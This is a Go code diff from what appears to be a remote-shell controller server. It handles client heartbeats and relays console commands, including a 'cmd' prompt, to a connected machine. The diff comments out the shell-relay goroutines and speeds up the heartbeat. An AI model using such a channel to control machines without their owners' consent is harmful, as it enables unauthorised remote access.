@@ -101,8 +101,22 @@ func doServerStuff(conn net.Conn) {
 				}
 				var msg *CMSG = *(**CMSG)(unsafe.Pointer(&buf))
 				fmt.Printf("Recv:\n\tMSG: %s \n\tMOD: %d \n\tLONG: %d \n", msg.sign, msg.mod, msg.msg_l)
+				//go func() {
+				//	//test function
+				//
+				//	reader := bufio.NewReader(os.Stdin)
+				//	for{
+				//		backshell := <- shellOutChan
+				//		dec:= mahonia.NewDecoder("GBK")
+				//		output := dec.ConvertString(backshell)
+				//
+				//		fmt.Println("Remote:\n",strings.TrimSpace(output),"RemoteEnd")
+				//		text, _ := reader.ReadString('\n')
+				//		shellInChan<-text
+				//	}
+				//}()
 
-				time.Sleep(10 * time.Second)
+				time.Sleep(1 * time.Second)
 				Handle(conn, SERVER_HEARTS) // 十秒一次心跳包
 			} else {
 				//其他操作中，暂时停止
@@ -158,39 +172,36 @@ func Handle(conn net.Conn, code int) {
 			s.status = SERVER_HEARTS
 			return
 		}
-		go func() {
-			for {
-				shell, ok := <-shellInChan
-				if ok {
-					s.status = SERVER_HEARTS
-					return
-				}
-				l, err := conn.Write([]byte(shell))
-				if err != nil || l == 0 {
-					s.status = SERVER_HEARTS
-					return
-				}
-				if shell == "reset" {
-					s.status = SERVER_HEARTS
-					return
-				}
-			}
-		}()
-		go func() {
-			for {
-				buf := make([]byte, 1024)
-				l, err := conn.Read(buf)
-				if err != nil || l == 0 {
-					s.status = SERVER_HEARTS
-					return
-				}
-				if string(buf[:]) == "reset" {
-					s.status = SERVER_HEARTS
-					return
-				}
-				shellOutChan <- string(buf[:])
-			}
-		}()
-
+		//go func() {
+		//	for {
+		//		shell, _ := <-shellInChan
+		//
+		//		l, err := conn.Write([]byte(shell))
+		//		if err != nil || l == 0 {
+		//			fmt.Println("Send Error",err.Error())
+		//			s.status = SERVER_HEARTS
+		//			return
+		//		}
+		//		if shell == "reset" {
+		//			s.status = SERVER_HEARTS
+		//			return
+		//		}
+		//
+		//	}
+		//}()
+		//shellInChan<-"cmd\r\n"
+		//		for {
+		//			buf := make([]byte, 1024)
+		//			l, err := conn.Read(buf)
+		//			if err != nil || l == 0 {
+		//				s.status = SERVER_HEARTS
+		//				return
+		//			}
+		//			if string(buf[:]) == "reset" {
+		//				s.status = SERVER_HEARTS
+		//				return
+		//			}
+		//			shellOutChan <- string(buf[:])
+		//		}
 	}
 }
